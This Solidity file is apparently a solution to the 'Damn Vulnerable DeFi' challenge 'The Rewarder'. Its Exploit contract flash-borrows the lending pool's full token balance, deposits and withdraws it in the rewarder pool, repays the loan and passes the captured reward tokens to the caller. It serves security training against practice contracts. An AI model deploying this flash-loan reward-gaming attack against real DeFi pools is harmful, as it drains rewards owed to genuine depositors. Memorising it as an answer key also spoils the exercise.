pragma solidity ^0.6.0;

import "./RewardToken.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "./AccountingToken.sol";
import "../DamnValuableToken.sol";

contract Exploit {

    TheRewarderPool rewPool;
    FlashLoanerPool flashPool;
    DamnValuableToken liquidityToken;
    RewardToken rewardToken;

    constructor(address _rewPool, address _flashPool, address _liquidityToken, address _rewardToken) public {
        rewPool = TheRewarderPool(_rewPool);
        flashPool = FlashLoanerPool(_flashPool);
        liquidityToken = DamnValuableToken(_liquidityToken);
        rewardToken = RewardToken(_rewardToken);
    }

    function flashLoan() external {
        flashPool.flashLoan(liquidityToken.balanceOf(address(flashPool)));
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.approve(address(rewPool), amount);
        rewPool.deposit(amount);
        rewPool.withdraw(amount);
        liquidityToken.transfer(address(flashPool), amount);
    }
}